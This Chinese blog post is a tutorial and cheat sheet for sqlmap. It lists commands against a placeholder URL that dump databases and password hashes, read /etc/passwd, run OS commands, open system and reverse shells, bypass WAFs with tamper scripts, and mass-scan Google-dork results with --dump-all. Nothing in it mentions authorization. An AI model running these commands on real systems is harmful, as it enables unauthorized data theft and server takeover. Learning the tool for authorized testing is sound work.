---
title: sqlmap简单用法
tags:
  - 工具
  - sqlmap
categories:
  - 学习
  - 工具用法
abbrlink: 15042a92
date: 2022-06-16 22:16:08
---

## sqlmap介绍

sqlmap是一个开源的渗透测试工具，可以自动检测和利用SQL注入缺陷并接管数据库服务器。它具有强大的检测引擎，许多用于终极渗透测试仪的利基功能，以及广泛的开关，包括数据库指纹识别，从数据库获取数据，访问底层文件系统以及通过带外连接在操作系统上执行命令。

<br>

sqlmap官方网站：http://www.sqlmap.org/

<br>

sqlmap支持五种不同的注入模式：

- 基于布尔的盲注，即可以根据返回页面判断条件真假的注入；
- 基于时间的盲注，即不能根据页面返回内容判断任何信息，用条件语句查看时间延迟语句是否执行（即页面返回时间是否增加）来判断；
- 基于报错注入，即页面会返回错误信息，或者把注入的语句的结果直接返回在页面中；
- 联合查询注入，可以使用union的情况下的注入；
- 堆查询注入，可以同时执行多条语句的执行时的注入。

## 用法

### SQLMap的一些参数

####  枚举

  T这些选项可用于枚举后端数据库管理系统的信息、结构和数据表。此外，还可以运行自己的SQL语句
  -a, --all      #检索全部
  -b, --banner     #检索 banner
  --current-user    #检索当前用户
  --current-db     #检索当前数据库
  --passwords     #列出用户密码的hash值
  --tables       #列出表
  --columns      #列出字段
  --schema       #列出DBMS schema
  --dump        #Dump DBMS数据库表的条目
  --dump-all      #Dump 所有DBMS数据库表的条目
  -D DB        #指定数据库
  -T TBL        #指定表
  -C COL        #指定字段



#### 测试注入点权限

测试所有用户的权限：sqlmap -u URL -- privileges

测试a用户的权限：sqlmap -u URL -- privileges -U a

#### 执行shell命令

sqlmap -u URL --os-cmd="net user"

系统交互的shell：sqlmap -u URL --os-shell

#### 执行sql命令

SQL交互的shell，执行sql语句：sqlmap -u URL --sql-shell

sqlmap -u URL --sql-query="sql"

#### POST提交方式

sqlmap -u URL --data "POST参数"

#### 显示详细的等级

sqlmap -u URL --dbs -v 1

-v 参数包含7个等级。

0:    只显示Python的回溯、错误和关键消息。

1：显示信息和警告信息。

2：显示调试信息。

3：有效载荷注入。

4：显示HTTP请求。

5：显示HTTP响应头。

6：显示HTTP响应页面的内容。

#### 注入HTTP请求

sqlmap -r test.txt --dbs

test.txt 的内容为HTTP请求。

--referer  ""  #使用referer欺骗


#### 注入等级

sqlmap -u URL --level 3	#sqlmap默认测试所有的GET和POST参数，当--level的值大于等于2的时候也会测试HTTP Cookie头的值，当大于等于3的时候也会测试User-Agent和HTTP Referer头的值。最高为5


#### 使用sqlmap插件

sqlmap -u URL -tamper "插件名称"

插件一般都保存在sqlmap目录下的tamper文件夹中，通常用来绕过WAF。

#### 其他参数

```
 --risk 3           #执行测试的风险（0-3，默认为1）risk越高，越慢但是越安全
 --tamper xx.py,cc.py   #防火墙绕过，后接tamper库中的py文件
  --proxy “目标地址″   #使用代理注入
```

 --risk 3           执行测试的风险（0-3，默认为1）risk越高，越慢但是越安全

--threads 10  线程，sqlmap线程最高设置为10

--dump	参数意为转存数据，-C参数指定字段名称，-T指定表名，-D指定数据库名称。如果有数据库关键字需要加上"[]",如[User]。
读取数据后，数据会存到sqlmap/output/下


### 基本步骤

 #获取当前用户名称

```
sqlmap -u "http://XXXXXXX?id=1" --current-user
```

 #获取当前数据库名称

```
sqlmap -u "http://XXXXXXX?id=1" --current-db
```

 #列表名

```
sqlmap -u "http://XXXXXXX?id=1" --tables -D "db_name"
```



 #列字段

```
sqlmap -u "http://XXXXXXX?id=1" --columns -T "tablename" users-D "db_name" -v 0
```



 #获取字段内容

```
sqlmap -u "http://XXXXXXX?id=1" --dump -C "column_name" -T "table_name" -D"db_name" -v 0
```







### 信息获取

#smart 智能 level 执行测试等级

```
sqlmap -u "http://XXXXXXX?id=1" --smart --level 3 --users
```

#dbms 指定数据库类型

```
sqlmap -u "http://XXXXXXX?id=1" --dbms "Mysql" --users 
```



 #列数据库用户

```
sqlmap -u "http://XXXXXXX?id=1" --users
```



#列数据库

```
sqlmap -u "http://XXXXXXX?id=1" --dbs
```



 #数据库用户密码

```
sqlmap -u "http://XXXXXXX?id=1" --passwords
```



#列出指定用户数据库密码

```
sqlmap -u "http://XXXXXXX?id=1" --passwords-U root -v 0 
```



 #列出指定字段，列出 20 条

```
sqlmap -u "http://XXXXXXX?id=1" --dump -C "password,user,id" -T "tablename" -D "db_name" --start 1 --stop 20
```



 #列出所有数据库所有表

```
sqlmap -u "http://XXXXXXX?id=1" --dump-all -v 0
```



 #查看权限

```
sqlmap -u "http://XXXXXXX?id=1" --privileges
```



#查看指定用户权限

```
sqlmap -u "http://XXXXXXX?id=1" --privileges -U root 
```



#是否是数据库管理员

```
sqlmap -u "http://XXXXXXX?id=1" --is-dba -v 1 
```



#枚举数据库用户角色

```
sqlmap -u "http://XXXXXXX?id=1" --roles 
```



 #导入用户自定义函数（获取系统权限！）

```
sqlmap -u "http://XXXXXXX?id=1" --udf-inject
```



 #列出当前库所有表

```
sqlmap -u "http://XXXXXXX?id=1" --dump-all --exclude-sysdbs -v 0
```



 #union 查询表记录

```
sqlmap -u "http://XXXXXXX?id=1" --union-cols
```



 #cookie 注入

```
sqlmap -u "http://XXXXXXX?id=1" --cookie "COOKIE_VALUE"
```



#获取 banner 信息

```
sqlmap -u "http://XXXXXXX?id=1" -b 
```



 #post 注入

```
sqlmap -u "http://XXXXXXX?id=1" --data "id=3"
```



#指纹判别数据库类型

```
sqlmap -u "http://XXXXXXX?id=1" -v 1 -f 
```



#代理注入

```
sqlmap -u "http://XXXXXXX?id=1" --proxy"http://127.0.0.1:8118" 
```



 #指定关键词

```
sqlmap -u "http://XXXXXXX?id=1"--string"STRING_ON_TRUE_PAGE"
```



#执行指定 sql 命令

```
sqlmap -u "http://XXXXXXX?id=1" --sql-shell 
```



文件位置

```
sqlmap -u "http://XXXXXXX?id=1" --file /etc/passwd
```



 #执行系统命令

```
sqlmap -u "http://XXXXXXX?id=1" --os-cmd=whoami
```



 #系统交互 shell

```
sqlmap -u "http://XXXXXXX?id=1" --os-shell
```



 #反弹 shell

```
sqlmap -u "http://XXXXXXX?id=1" --os-pwn
```



 #读取 win 系统注册表

```
sqlmap -u "http://XXXXXXX?id=1" --reg-read
```



#保存进度

```
sqlmap -u "http://XXXXXXX?id=1" --dbs-o "sqlmap.log" 
```



 #恢复已保存进度

```
sqlmap -u "http://XXXXXXX?id=1" --dbs -o "sqlmap.log" --resume
```



#反弹 shell 需metasploit 路径

```
sqlmap -u "http://XXXXXXX?id=1" --msf-path=/opt/metasploit3/msf2 --os-pwn 
```



#加载脚本(可利用绕过注入限制)

```
sqlmap -u "http://XXXXXXX?id=1" --tamper "base64encode.py" 
```



 #google 搜索注入点自动 跑出所有字段

```
sqlmap -g "google 语法" --dump-all --batch
```



<br>



---



参考

[sqlmap的简单使用 - 走看看 (zoukankan.com)](http://t.zoukankan.com/whitehawk-p-9880179.html)

[超详细SQLMap使用攻略及技巧分享 - 锦瑟，无端 - 博客园 (cnblogs.com)](https://www.cnblogs.com/cscshi/p/15705030.html#11-sqlmap简介)

[sqlmap 简单使用 - 程序员大本营 (pianshen.com)](https://www.pianshen.com/article/6093727338/)

[sqlmap用法 (bbsmax.com)](https://www.bbsmax.com/A/MyJxXaLXJn/)



百度链接：https://pan.baidu.com/s/12HA0xCzaU2PgtxAALrpFLQ?pwd=ru6w 
提取码：ru6w
